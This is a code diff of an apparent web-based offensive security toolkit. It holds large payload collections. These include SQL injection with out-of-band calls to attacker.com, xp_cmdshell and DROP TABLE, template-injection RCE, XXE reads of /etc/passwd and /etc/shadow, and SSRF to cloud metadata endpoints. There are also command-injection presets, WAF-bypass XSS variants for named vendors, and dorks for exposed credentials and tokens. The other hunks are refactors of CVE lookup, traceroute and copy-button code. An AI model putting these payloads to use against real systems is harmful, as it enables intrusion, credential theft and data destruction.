86, "cat": "SQLi", "tag": "time-based", "type": "Oracle DBMS_PIPE", "payload": "'; exec dbms_pipe.receive_message(('a'),5)--"}, {"id": 87, "cat": "SQLi", "tag": "oob", "type": "MSSQL xp_dirtree DNS", "payload": "'; exec master..xp_dirtree '//attacker.com/sqli'--"}, {"id": 88, "cat": "SQLi", "tag": "oob", "type": "Oracle UTL_HTTP", "payload": "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?q='||user) FROM dual--"}, {"id": 89, "cat": "SQLi", "tag": "oob", "type": "MySQL INTO OUTFILE", "payload": "1 UNION SELECT 1 INTO OUTFILE '//attacker.com/sqli'"}, {"id": 90, "cat": "SQLi", "tag": "stacked", "type": "Stacked MySQL INSERT", "payload": "1; INSERT INTO users(user,pass) VALUES('hacked','hacked')--"}, {"id": 91, "cat": "SQLi", "tag": "stacked", "type": "MSSQL xp_cmdshell", "payload": "1; EXEC xp_cmdshell('whoami')--"}, {"id": 92, "cat": "SQLi", "tag": "stacked", "type": "Second Order", "payload": "admin' + (SELECT TOP 1 password FROM users) + '"}, {"id": 93, "cat": "SQLi", "tag": "waf-adv", "type": "Tab Bypass", "payload": "1' OR '1'='1  [tab instead of space]"}, {"id": 94, "cat": "SQLi", "tag": "waf-adv", "type": "Case Variation", "payload": "1' oR '1'='1"}, {"id": 95, "cat": "SQLi", "tag": "waf-adv", "type": "Comment Frag", "payload": "1'/**/OR/**/1=1--"}, {"id": 96, "cat": "SQLi", "tag": "waf-adv", "type": "Hex String", "payload": "1 UNION SELECT 0x61646d696e,0x70617373--"}, {"id": 97, "cat": "SSTI", "tag": "detection", "type": "Detection Probe", "payload": "{{7*7}} ${7*7} #{7*7} *{7*7}"}, {"id": 98, "cat": "SSTI", "tag": "jinja2", "type": "Jinja2 RCE", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}, {"id": 99, "cat": "SSTI", "tag": "jinja2", "type": "Jinja2 Config", "payload": "{{config.items()}}"}, {"id": 100, "cat": "SSTI", "tag": "twig", "type": "Twig PHP RCE", "payload": "{{['id']|filter('system')}}"}, {"id": 101, "cat": "SSTI", "tag": "freemarker", "type": "FreeMarker RCE", "payload": "\u003c#assign ex=\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"id\")}"}, {"id": 102, "cat": "SSTI", "tag": "erb", "type": "ERB Ruby RCE", "payload": "\u003c%= system('id') %\u003e"}, {"id": 103, "cat": "SSRF", "tag": "basic", "type": "localhost", "payload": "http://localhost/admin"}, {"id": 104, "cat": "SSRF", "tag": "basic", "type": "AWS Metadata", "payload": "http://169.254.169.254/latest/meta-data/"}, {"id": 105, "cat": "SSRF", "tag": "basic", "type": "GCP Metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/"}, {"id": 106, "cat": "SSRF", "tag": "bypass", "type": "0.0.0.0", "payload": "http://0.0.0.0/admin"}, {"id": 107, "cat": "SSRF", "tag": "bypass", "type": "IPv6 localhost", "payload": "http://[::1]/admin"}, {"id": 108, "cat": "SSRF", "tag": "bypass", "type": "Decimal IP", "payload": "http://2130706433/admin"}, {"id": 109, "cat": "SSRF", "tag": "bypass", "type": "URL Redirect", "payload": "http://attacker.com@localhost/admin"}, {"id": 110, "cat": "XXE", "tag": "classic", "type": "XXE /etc/passwd", "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e\u003cfoo\u003eREF:xxe\u003c/foo\u003e"}, {"id": 111, "cat": "XXE", "tag": "classic", "type": "XXE /etc/shadow", "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"file:///etc/shadow\"\u003e]\u003e\u003cfoo\u003eREF:xxe\u003c/foo\u003e"}, {"id": 112, "cat": "XXE", "tag": "oob", "type": "XXE OOB DNS", "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE r [\u003c!ENTITY % x SYSTEM \"http://attacker.com/\"\u003e%x;]\u003e"}, {"id": 113, "cat": "XXE", "tag": "blind", "type": "XXE Blind DTD", "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE r [\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e%file;]\u003e\u003cr\u003e\u003c/r\u003e"}, {"id": 114, "cat": "Dorks", "tag": "cloud", "type": "AWS S3 Open", "payload": "site:s3.amazonaws.com \"index of\""}, {"id": 115, "cat": "Dorks", "tag": "cloud", "type": "Azure Blob", "payload": "site:blob.core.windows.net \"index of\""}, {"id": 116, "cat": "Dorks", "tag": "cloud", "type": "Firebase DB", "payload": "site:firebaseio.com"}, {"id": 117, "cat": "Dorks", "tag": "cloud", "type": "GCS Exposed", "payload": "site:storage.googleapis.com \"index of\""}, {"id": 118, "cat": "Dorks", "tag": "creds", "type": "Pastebin Creds", "payload": "site:pastebin.com password OR username OR api_key"}, {"id": 119, "cat": "Dorks", "tag": "creds", "type": "GitHub Tokens", "payload": "site:github.com api_key OR secret_key OR access_token"}, {"id": 120, "cat": "Dorks", "tag": "creds", "type": "DB Conn Strings", "payload": "site:target.com \"mongodb://\" OR \"mysql://\" OR \"postgresql://\""}, {"id": 121, "cat": "Dorks", "tag": "creds", "type": "JWT Exposed", "payload": "site:target.com intext:eyJhbGciOiJIUzI1NiJ9"}, {"id": 122, "cat": "Dorks", "tag": "vuln-scan", "type": "Shodan Default Creds", "payload": "http.title:RouterOS OR http.title:Synology OR http.title:QNAP"}, {"id": 123, "cat": "Dorks", "tag": "vuln-scan", "type": "WordPress", "payload": "site:target.com inurl:wp-login.php"}];
 
 
 var REPO_DB=[
@@ -5179,12 +5184,12 @@ function jwtClear(){
 // ══════════════════════════════════════════════════════════════
 var OBF_PRESETS={
   xss:[
-    '\x3cscript\x3ealert(1)\x3c/script\x3e',
-    '\x3cimg src=x onerror=alert(1)\x3e',
-    '\x3csvg/onload=alert(1)\x3e',
+    '\u003cscript\u003ealert(1)\u003c\/script\u003e',
+    '\u003cimg src=x onerror=alert(1)\u003e',
+    '\u003csvg/onload=alert(1)\u003e',
     'javascript:alert(1)',
-    '\x27\x22\x3e\x3cscript\x3ealert(document.domain)\x3c/script\x3e',
-    '\x3ciframe src=\x22javascript:alert(1)\x22\x3e',
+    '\x27\x22\u003e\u003cscript\u003ealert(document.domain)\u003c\/script\u003e',
+    '\u003ciframe src=\x22javascript:alert(1)\x22\u003e',
   ],
   sqli:[
     "' OR '1'='1",
@@ -5218,6 +5223,11 @@ var OBF_PRESETS={
     '{{self.__dict__}}',
     "{{''.__class__.mro()[1].__subclasses__()}}",
   ],
+  rce:['`id`','$(id)',';id;','| id |','$(whoami)','%0aid','& whoami &','; cat /etc/passwd ;','`cat /etc/passwd`'],
+  xxe:['\u003c?xml version="1.0"?\u003e\u003c!DOCTYPE root [\u003c!ENTITY xxe SYSTEM "file:///etc/passwd"\u003e]\u003e\u003croot\u003e&xxe;\u003c/root\u003e','\u003c?xml version="1.0"?\u003e\u003c!DOCTYPE data [\u003c!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"\u003e]\u003e\u003cdata\u003e&file;\u003c/data\u003e'],
+  ssrf:['http://127.0.0.1/','http://169.254.169.254/latest/meta-data/','http://localhost:6379/','http://metadata.google.internal/computeMetadata/v1/','dict://localhost:11211/'],
+  nosqli:["' || '1'=='1","[$ne]=1","[$gt]=","{'\$where':'this.password.length\u003e0'}","{\"\$regex\":\".*\"}"],
+  open_redirect:['//evil.com','//evil.com%2F..','/%09/evil.com','javascript:alert(document.domain)','//\tevil.com'],
 };
 
 var _obfPresetList=[];
@@ -5313,17 +5323,26 @@ function obfRun(){
     if(outEl) outEl.value=results[0].r;
     if(multiDiv) multiDiv.style.display='block';
     if(multiContent){
-      multiContent.innerHTML=results.map(function(res){
+      multiContent.innerHTML=results.map(function(res,ri){
         return '<div style="margin-bottom:8px;">'+
           '<span style="color:rgba(0,255,65,.4);font-size:.6rem;">// '+escH(res.t.toUpperCase().replace(/_/g,' '))+'</span><br>'+
           '<span style="color:rgba(0,255,65,.75);word-break:break-all;">'+escH(res.r)+'</span>'+
-          '<button onclick="navigator.clipboard.writeText('+JSON.stringify(JSON.stringify(res.r))+')" '+
-          'style="margin-left:8px;background:transparent;border:1px solid rgba(0,255,65,.2);'+
-          'color:rgba(0,255,65,.4);font-family:var(--font);font-size:.55rem;padding:1px 5px;cursor:pointer;">⧉</button>'+
+          '<button data-ri="'+ri+'" class="obf-cp" style="margin-left:8px;background:transparent;border:1px solid rgba(0,255,65,.2);color:rgba(0,255,65,.4);font-family:var(--font);font-size:.55rem;padding:1px 5px;cursor:pointer;">⧉</button>'+
           '</div>';
       }).join('');
     }
     if(statusEl) statusEl.textContent='✓ '+results.length+' variantes generadas';
+    window._obfResults=results.map(function(x){return x.r;});
+    if(multiContent){
+      multiContent.onclick=function(ev){
+        var btn=ev.target.closest('.obf-cp');
+        if(!btn) return;
+        var ri=parseInt(btn.getAttribute('data-ri'));
+        if(window._obfResults&&window._obfResults[ri]!==undefined){
+          navigator.clipboard.writeText(window._obfResults[ri]).then(function(){btn.textContent='✓';setTimeout(function(){btn.textContent='⧉';},1200);});
+        }
+      };
+    }
   } else {
     var result=obfApply(payload,technique);
     if(outEl) outEl.value=result;
@@ -5943,7 +5962,7 @@ function genDorks(){
     if(!def) return;
     dorkOut('<div style="margin-bottom:4px;"><span style="color:rgba(0,255,65,.35);font-family:var(--font);font-size:.62rem;">── '+escH(def.label)+'</span></div>');
 
-    def.dorks.forEach(function(tmpl){
+    def.dorks.forEach(function(tmpl,di){
       var dork=tmpl.replace(/\{d\}/g,domain);
       _dorkList.push(dork);
       total++;
@@ -5952,9 +5971,7 @@ function genDorks(){
         '<div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:3px;padding:3px 0;border-bottom:1px solid rgba(0,255,65,.04);">'+
         '<code style="font-family:var(--font);font-size:.62rem;color:rgba(0,255,65,.75);flex:1;word-break:break-all;">'+escH(dork)+'</code>'+
         '<div style="display:flex;gap:4px;flex-shrink:0;">'+
-        '<button onclick="navigator.clipboard.writeText('+JSON.stringify(JSON.stringify(dork))+')" '+
-          'style="background:transparent;border:1px solid rgba(0,255,65,.15);color:rgba(0,255,65,.4);'+
-          'font-family:var(--font);font-size:.55rem;padding:1px 5px;cursor:pointer;white-space:nowrap;">⧉</button>'+
+        '<button data-di="'+di+'" class="dork-cp" style="background:transparent;border:1px solid rgba(0,255,65,.15);color:rgba(0,255,65,.4);font-family:var(--font);font-size:.55rem;padding:1px 5px;cursor:pointer;white-space:nowrap;">⧉</button>'+
         '<a href="'+escH(gUrl)+'" target="_blank" '+
           'style="background:transparent;border:1px solid rgba(0,255,65,.15);color:rgba(0,255,65,.4);'+
           'font-family:var(--font);font-size:.55rem;padding:1px 5px;text-decoration:none;white-space:nowrap;">▶ Google</a>'+
@@ -7207,76 +7224,93 @@ async function searchCVE(){
   var q=(document.getElementById('cve-query')||{value:''}).value.trim();
   var o=document.getElementById('cve-out');
   if(!q){alert('Ingresa un CVE ID o keyword');return;}
-  o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Buscando CVEs...</span>\n';
+  o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Buscando: '+escH(q)+'...</span>\n';
   var isCVE=/^CVE-\d{4}-\d+$/i.test(q);
 
-  // ── CIRCL CVE Search via allorigins (CORS bypass) ──
+  function renderCVE(id, score, sev, desc, refs){
+    var col=sev==='CRITICAL'?'var(--red)':sev==='HIGH'?'var(--amber)':sev==='MEDIUM'?'#ffc800':'var(--g)';
+    var h='<span style="color:var(--amber);font-weight:700;">'+escH(id)+'</span>';
+    if(score&&score!=='N/A') h+=' <span style="color:'+col+';font-size:.85em;">CVSS:'+escH(String(score))+' ['+escH(sev)+']</span>';
+    h+='\n  <span style="color:rgba(0,255,65,.7);">'+escH(desc.substring(0,200))+(desc.length>200?'...':'')+'</span>\n';
+    if(refs&&refs.length){
+      refs.slice(0,2).forEach(function(r){
+        h+='  <a href="'+escH(r)+'" target="_blank" style="color:rgba(0,255,65,.4);font-size:.72em;">↗ '+escH(r.substring(0,70))+'</a>\n';
+      });
+    }
+    h+='\n';
+    return h;
+  }
+
+  // ── 1. CIRCL CVE API via allorigins proxy ──────────────────
   try{
     var circl_url=isCVE
       ?'https://cve.circl.lu/api/cve/'+encodeURIComponent(q.toUpperCase())
       :'https://cve.circl.lu/api/search/'+encodeURIComponent(q)+'/'+encodeURIComponent(q);
     var proxy='https://api.allorigins.win/get?url='+encodeURIComponent(circl_url);
-    var r1=await fetch(proxy,{signal:AbortSignal.timeout(12000)});
+    var r1=await fetch(proxy,{signal:AbortSignal.timeout(14000)});
     if(r1.ok){
       var wrapper=await r1.json();
-      var cd=JSON.parse(wrapper.contents||'null');
-      if(cd){
-        var list=isCVE?(cd.id?[cd]:[]):(cd.results||[]);
-        if(list.length&&list[0]&&list[0].id){
-          var html='<span style="color:var(--g)">// '+list.length+' CVE(s) — CIRCL</span>\n\n';
-          list.slice(0,12).forEach(function(v){
-            var score=v.cvss3||v.cvss||'N/A';
+      var raw=wrapper.contents||'';
+      if(raw&&raw!=='null'&&raw.length>5){
+        var cd=JSON.parse(raw);
+        // CIRCL single CVE: {id, cvss, summary, references}
+        // CIRCL search: {results:[...]}
+        var list=[];
+        if(cd&&cd.id) list=[cd];                          // single CVE
+        else if(cd&&Array.isArray(cd.results)) list=cd.results; // search
+        else if(Array.isArray(cd)) list=cd;               // direct array
+        if(list.length){
+          var html='<span style="color:var(--g)">// '+list.length+' CVE(s) encontrados — CIRCL.lu</span>\n\n';
+          list.slice(0,15).forEach(function(v){
+            var score=v.cvss3||v.cvss||v.cvss_score||'N/A';
             var sev=score==='N/A'?'INFO':parseFloat(score)>=9?'CRITICAL':parseFloat(score)>=7?'HIGH':parseFloat(score)>=4?'MEDIUM':'LOW';
-            var col=sev==='CRITICAL'?'var(--red)':sev==='HIGH'?'var(--amber)':sev==='MEDIUM'?'#ffc800':'var(--g)';
-            var desc=(v.summary||v.description||'Sin descripción').substring(0,180);
-            html+='<span style="color:var(--amber)">'+escX(v.id)+'</span>';
-            if(score!=='N/A') html+=' <span style="color:'+col+'">CVSS:'+score+' ['+escX(sev)+']</span>';
-            html+='\n  '+escX(desc)+(desc.length>=180?'...':'')+'\n';
-            if(v.references&&v.references.length){
-              v.references.slice(0,2).forEach(function(ref){
-                html+='  <a href="'+escX(ref)+'" target="_blank" style="color:rgba(0,255,65,.4);font-size:.7em;">↗ '+escX(ref.substring(0,60))+'</a>\n';
-              });
-            }
-            html+='\n';
+            var desc=v.summary||v.description||'Sin descripción';
+            var refs=v.references||[];
+            html+=renderCVE(v.id||v.cve_id||'?',score,sev,desc,refs);
           });
+          html+='<a href="https://www.cvedetails.com/vulnerability-search.php?f=1&vendor=&product=&cveid=&cweid=&cvssscoremin=&cvssscoremax=&year=&month=&bydate=&opec=1&opov=1&opcsrf=1&opfileinc=1&opgpriv=1&opsqli=1&opxss=1&opdirt=1&ophttp=1&opbyp=1&opginf=1&opdos=1&keyword='+encodeURIComponent(q)+'&search=Search" target="_blank" style="color:rgba(0,255,65,.4);font-size:.72em;">↗ CVEDetails</a>  ';
+          html+='<a href="https://nvd.nist.gov/vuln/search/results?query='+encodeURIComponent(q)+'" target="_blank" style="color:rgba(0,255,65,.4);font-size:.72em;">↗ NVD Search</a>\n';
           o.innerHTML=html;
           return;
         }
       }
     }
-  }catch(e){}
+  }catch(e1){}
 
-  // ── Fallback: NVD 2.0 direct (may hit 429 rate-limit) ──
+  // ── 2. NVD 2.0 via allorigins proxy ─────────────────────────
   try{
-    o.innerHTML+='<span style="color:rgba(0,255,65,.3)">// Intentando NVD API...</span>\n';
-    var nvd=isCVE
+    o.innerHTML+='<span style="color:rgba(0,255,65,.3)">// Consultando NVD...</span>\n';
+    var nvdUrl=isCVE
       ?'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId='+encodeURIComponent(q.toUpperCase())
-      :'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch='+encodeURIComponent(q)+'&resultsPerPage=8';
-    var r2=await fetch(nvd,{signal:AbortSignal.timeout(15000)});
-    if(!r2.ok) throw new Error('NVD HTTP '+r2.status);
-    var data=await r2.json();
-    var vulns=(data.vulnerabilities||[]);
-    if(!vulns.length){o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Sin resultados para: '+escX(q)+'</span>';return;}
-    var html='<span style="color:var(--g)">// '+vulns.length+' CVE(s) — NVD</span>\n\n';
+      :'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch='+encodeURIComponent(q)+'&resultsPerPage=10';
+    var nvdProxy='https://api.allorigins.win/get?url='+encodeURIComponent(nvdUrl);
+    var r2=await fetch(nvdProxy,{signal:AbortSignal.timeout(18000)});
+    if(!r2.ok) throw new Error('HTTP '+r2.status);
+    var w2=await r2.json();
+    var data=JSON.parse(w2.contents||'{}');
+    var vulns=data.vulnerabilities||[];
+    if(!vulns.length) throw new Error('Sin resultados');
+    var html='<span style="color:var(--g)">// '+vulns.length+' CVE(s) — NVD 2.0</span>\n\n';
     vulns.forEach(function(v){
       var cve=v.cve||{};
       var id=cve.id||'?';
       var desc=((cve.descriptions||[]).find(function(d){return d.lang==='en';})||{value:'N/A'}).value;
-      var m3=(((cve.metrics||{}).cvssMetricV31||(cve.metrics||{}).cvssMetricV30||[])[0]||{}).cvssData||{};
+      var m31=(((cve.metrics||{}).cvssMetricV31||[])[0]||{}).cvssData||{};
+      var m30=(((cve.metrics||{}).cvssMetricV30||[])[0]||{}).cvssData||{};
       var m2=(((cve.metrics||{}).cvssMetricV2||[])[0]||{}).cvssData||{};
-      var score=m3.baseScore||m2.baseScore||'N/A';
-      var sev=(m3.baseSeverity||m2.baseSeverity||'INFO').toUpperCase();
-      var col=sev==='CRITICAL'?'var(--red)':sev==='HIGH'?'var(--amber)':sev==='MEDIUM'?'#ffc800':'var(--g)';
-      html+='<span style="color:var(--amber)">'+escX(id)+'</span>';
-      if(score!=='N/A') html+=' <span style="color:'+col+'">CVSS:'+score+' ['+escX(sev)+']</span>';
-      html+='\n  '+escX(desc.substring(0,180))+(desc.length>180?'...':'')+'\n\n';
+      var score=m31.baseScore||m30.baseScore||m2.baseScore||'N/A';
+      var sev=(m31.baseSeverity||m30.baseSeverity||m2.baseSeverity||'INFO').toUpperCase();
+      var refs=(cve.references||[]).slice(0,2).map(function(r){return r.url;});
+      html+=renderCVE(id,score,sev,desc,refs);
     });
     o.innerHTML=html;
-  }catch(e){
-    o.innerHTML='<span style="color:var(--red)">// '+escX(e.message)+'</span>\n';
-    o.innerHTML+='<a href="https://www.cvedetails.com/cve/'+encodeURIComponent(q.toUpperCase())+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ CVEDetails</a>  ';
-    o.innerHTML+='<a href="https://nvd.nist.gov/vuln/detail/'+encodeURIComponent(q.toUpperCase())+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ NVD</a>\n';
-  }
+    return;
+  }catch(e2){}
+
+  // ── 3. No results ────────────────────────────────────────────
+  o.innerHTML='<span style="color:rgba(0,255,65,.4)">// Sin resultados para: '+escH(q)+'</span>\n'+
+    '<a href="https://www.cvedetails.com/cve-search.php?vendor_id=0&product_id=0&version_id=0&year=0&month=0&cvssscoremin=0&cvssscoremax=0&opec=0&opov=0&opcsrf=0&opfileinc=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&ophttp=0&opbyp=0&opginf=0&opdos=0&include_files=0&keyword='+encodeURIComponent(q)+'&submit=Search" target="_blank" style="color:rgba(0,255,65,.5)">↗ Buscar en CVEDetails</a>  '+
+    '<a href="https://nvd.nist.gov/vuln/search/results?query='+encodeURIComponent(q)+'" target="_blank" style="color:rgba(0,255,65,.5)">↗ NVD</a>\n';
 }
 
 async function checkBugBounty(){
@@ -7703,21 +7737,24 @@ async function runTraceroute(){
 
   var txt=null;
 
-  // ── SOURCE 1: dnschecker.org (POST via allorigins) ────────────
+  // ── SOURCE 1: KeyCDN traceroute API (GET, CORS open, free) ──
   try{
-    geomapStatus('<span style="color:rgba(0,255,65,.4)">// [1/2] Intentando dnschecker.org...</span>');
-    var dcBody='host='+encodeURIComponent(domain);
-    var dcUrl='https://dnschecker.org/ajax_files/online_traceroute.php';
-    // POST via allorigins
-    var dcProxy='https://api.allorigins.win/get?url='+encodeURIComponent(dcUrl)+'&method=POST&body='+encodeURIComponent(dcBody);
-    var r1=await fetch(dcProxy,{signal:AbortSignal.timeout(25000)});
-    if(r1.ok){
-      var w1=await r1.json();
-      var raw1=w1.contents||'';
-      // dnschecker returns HTML or plain text with hop lines
-      // Strip HTML tags if present
-      raw1=raw1.replace(/<[^>]+>/g,' ').replace(/&nbsp;/g,' ').replace(/\s+/g,' ');
-      if(raw1.length>50&&!raw1.toLowerCase().includes('error')&&
+    geomapStatus('<span style="color:rgba(0,255,65,.4)">// [1/2] KeyCDN traceroute...</span>');
+    // Try direct first
+    var kcUrl='https://tools.keycdn.com/api/traceroute?host='+encodeURIComponent(domain);
+    var r1=null;
+    try{
+      r1=await fetch(kcUrl,{signal:AbortSignal.timeout(25000),headers:{'User-Agent':'y000-portfolio/1.0'}});
+    }catch(_ke){
+      // Fallback via allorigins
+      r1=await fetch('https://api.allorigins.win/get?url='+encodeURIComponent(kcUrl),{signal:AbortSignal.timeout(28000)});
+    }
+    if(r1&&r1.ok){
+      var kd=await r1.json();
+      // allorigins wraps in {contents:...}
+      if(kd.contents) kd=JSON.parse(kd.contents);
+      var raw1=(kd.data&&kd.data.output)||kd.output||'';
+      if(raw1&&raw1.length>30&&
          (raw1.match(/\d+\.\d+\.\d+\.\d+/)||raw1.match(/\d+\s+ms/))){
         txt=raw1;
       }
@@ -7963,12 +8000,12 @@ async function runUrlScan(){
             var pts=gd.loc.split(',');
             var icon=L.divIcon({
               html:'<div style="background:#ff9900;color:#000;border-radius:4px;padding:2px 5px;'+
-                'font-weight:900;font-size:10px;border:1px solid #000;white-space:nowrap;">urlscan</div>',
+                'font-weight:900;font-size:10px;border:1px solid #000;white-space:nowrap;">'+escH(domain)+'</div>',
               iconSize:[60,20],iconAnchor:[30,10],className:''
             });
             L.marker([parseFloat(pts[0]),parseFloat(pts[1])],{icon:icon})
               .addTo(_geoMapInstance)
-              .bindPopup('<b>urlscan IP</b><br>'+escH(page.ip)+'<br>'+escH(gd.city||'')+', '+escH(gd.country||''));
+              .bindPopup('<b>'+escH(domain)+'</b><br><span style="color:#888;">vía urlscan.io</span><br>'+escH(page.ip)+'<br>'+escH(gd.city||'')+', '+escH(gd.country||''));
           }
         }
       }catch(e){}
@@ -8392,55 +8429,145 @@ var TAKEOVER_FP={
 
 var PT_DB={
   xss:{
-    none:{html:['\\x3cscript\\x3ealert(document.domain)\\x3c/script\\x3e','\\x3cimg src=x onerror=alert(1)\\x3e','\\x3csvg onload=alert(1)\\x3e','\\x3cbody onload=alert(1)\\x3e','\\x3ciframe src=javascript:alert(1)\\x3e','\\x3cdetails open ontoggle=alert(1)\\x3e','\\x3cvideo src=x onerror=alert(1)\\x3e','javascript:/*--\\x3e\\x3c/title\\x3e\\x3c/style\\x3e\\x3c/textarea\\x3e\\x3c/script\\x3e\\x3cimg src=x onerror=alert(1)\\x3e'],attr:['" onmouseover=alert(1) x="',"' onmouseover=alert(1) x='",' " autofocus onfocus=alert(1) "','javascript:alert(1)','data:text/html,\\x3cscript\\x3ealert(1)\\x3c/script\\x3e'],js:["';alert(1)//","');alert(1)//",'\";alert(1)//','"};alert(1)//',"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"],url:['javascript:alert(1)','data:text/html,\\x3cscript\\x3ealert(1)\\x3c/script\\x3e','%3Cscript%3Ealert(1)%3C/script%3E','&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;']},
-    cloudflare:{html:['\\x3csvg/onload=alert(1)\\x3e','\\x3cimg src=x:x onerror=eval(atob("YWxlcnQoMSk="))\\x3e','\\x3cScRiPt\\x3ealert(1)\\x3c/ScRiPt\\x3e','\\x3c!--\\x3e\\x3cimg src=x onerror=alert(1)\\x3e','\\x3cobject data=javascript:alert(1)\\x3e'],attr:['" onpointerover=alert(1) "','" onpointerrawupdate=alert(1) "','" ontouchstart=alert(1) "'],js:["eval(String.fromCharCode(97,108,101,114,116,40,49,41))","Function('alert(1)')()","setTimeout('alert(1)')"],url:['%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E','\\x3cscript\\x3ealert(1)\\x3c/script\\x3e']},
-    modsec:{html:['\\x3cscr\\x00ipt\\x3ealert(1)\\x3c/scr\\x00ipt\\x3e','\\x3cscr%00ipt\\x3ealert(1)\\x3c/scr%00ipt\\x3e'],attr:['"/**/onmouseover=alert(1)/**/"','" %0aonmouseover=alert(1) "'],js:["';alert/**/(1)//","'.concat(String.fromCharCode(97,108,101,114,116)).concat('(1)')"],url:['?q=\\x3c/p\\x3e\\x3c!--%0a--\\x3e\\x3cscript\\x3ealert(1)\\x3c/script\\x3e']},
+    none:{
+      html:['\u003cscript\u003ealert(document.domain)\u003c\/script\u003e','\u003cimg src=x onerror=alert(1)\u003e','\u003csvg onload=alert(1)\u003e','\u003cbody onload=alert(1)\u003e','\u003ciframe src=javascript:alert(1)\u003e','\u003cdetails open ontoggle=alert(1)\u003e','\u003cvideo src=x onerror=alert(1)\u003e','\u003caudio src=x onerror=alert(1)\u003e','\u003cinput autofocus onfocus=alert(1)\u003e','\u003cform action=javascript:alert(1)\u003e\u003cinput type=submit\u003e','\u003cmath href=javascript:alert(1)\u003eMATH\u003c/math\u003e','\u003cstyle\u003e@keyframes x{from{color:red;}to{color:blue;}}*{animation:x 1s}*{-webkit-animation:x 1s}\u003c\/style\u003e\u003ca style="animation-name:x" onanimationstart="alert(1)"\u003eTRIGGER\u003c/a\u003e'],
+      attr:['" onmouseover=alert(1) x="',"' onmouseover=alert(1) x='",' " autofocus onfocus=alert(1) "','javascript:alert(1)','data:text/html,\u003cscript\u003ealert(1)\u003c\/script\u003e','" onpointerover=alert(1) "','" onclick=alert(1) "','" ondblclick=alert(1) "','" oncontextmenu=alert(1) "'],
+      js:["';alert(1)//","');alert(1)//",'\";alert(1)//','\"};alert(1)//',"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e","'-alert(1)-'","'+alert(1)+'","\u003c\/script\u003ealert(1)\u003c\/script\u003e"],
+      url:['javascript:alert(1)','data:text/html,\u003cscript\u003ealert(1)\u003c\/script\u003e','%3Cscript%3Ealert(1)%3C/script%3E','&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;','%0a\u003cscript\u003ealert(1)\u003c\/script\u003e']
+    },
+    cloudflare:{
+      html:['\u003csvg/onload=alert(1)\u003e','\u003cimg src=x:x onerror=eval(atob("YWxlcnQoMSk="))\u003e','\u003cScRiPt\u003ealert(1)\u003c/ScRiPt\u003e','\u003c!--\u003e\u003cimg src=x onerror=alert(1)\u003e','\u003cobject data=javascript:alert(1)\u003e','\u003ctemplate\u003e\u003cimg src=x onerror=alert(1)\u003e\u003c/template\u003e','\u003cmarquee onstart=alert(1)\u003e\u003c/marquee\u003e'],
+      attr:['" onpointerover=alert(1) "','" onpointerrawupdate=alert(1) "','" ontouchstart=alert(1) "','" onpointerenter=alert(1) "'],
+      js:["eval(String.fromCharCode(97,108,101,114,116,40,49,41))","Function('alert(1)')()","setTimeout('alert(1)')","(alert)(1)","[]['fill']['constructor']('alert(1)')()"],
+      url:['%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E','%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e']
+    },
+    modsec:{
+      html:['\u003cscr\x00ipt\u003ealert(1)\u003c/scr\x00ipt\u003e','\u003cscr%00ipt\u003ealert(1)\u003c/scr%00ipt\u003e','\u003c\x73\x63\x72\x69\x70\x74\u003ealert(1)\u003c/\x73\x63\x72\x69\x70\x74\u003e'],
+      attr:['"/**/onmouseover=alert(1)/**/"','" %0aonmouseover=alert(1) "'],
+      js:["';alert/**/(1)//","'.concat(String.fromCharCode(97,108,101,114,116)).concat('(1)')"],
+      url:['?q=\u003c/p\u003e\u003c!--%0a--\u003e\u003cscript\u003ealert(1)\u003c\/script\u003e']
+    },
+    akamai:{
+      html:['\u003cimg src=`\u003e\u003csvg onload=alert(1)\u003e`\u003e','\u003c%tag%20onmouseover=alert(1)\u003e'],
+      attr:['%22%20onmouseover%3dalert(1)%20%22','\\u0022 onmouseover=alert(1) \\u0022'],
+      js:['constructor["constructor"]("alert(1)")()','RegExp.input.replace(/.*/,alert)']
+    },
+    f5:{
+      html:['\u003cscript/\u003ealert(1)\u003c\/script\u003e','\u003cscript\x09\u003ealert(1)\u003c\/script\u003e'],
+      attr:['"onmouseover\x00=alert(1) "'],
+      js:["'|alert(1)|'"]
+    }
   },
   sqli:{
     none:{
-      url:["\' OR \'1\'=\'1","\' OR 1=1--","admin\'--","\' UNION SELECT null--",
-           "\' UNION SELECT null,null--","1\' ORDER BY 1--","1\' AND SLEEP(5)--",
-           "1\' UNION SELECT user(),version(),database()--","\'; DROP TABLE users--",
-           "1 WAITFOR DELAY \'0:0:5\'--","\' OR 1=1#"],
-      json:["1 OR 1=1","true; DROP TABLE users--","1 UNION SELECT 1,2,3--"],
-      header:["\' OR 1=1--","1\' ORDER BY 1--","admin\'/*"]
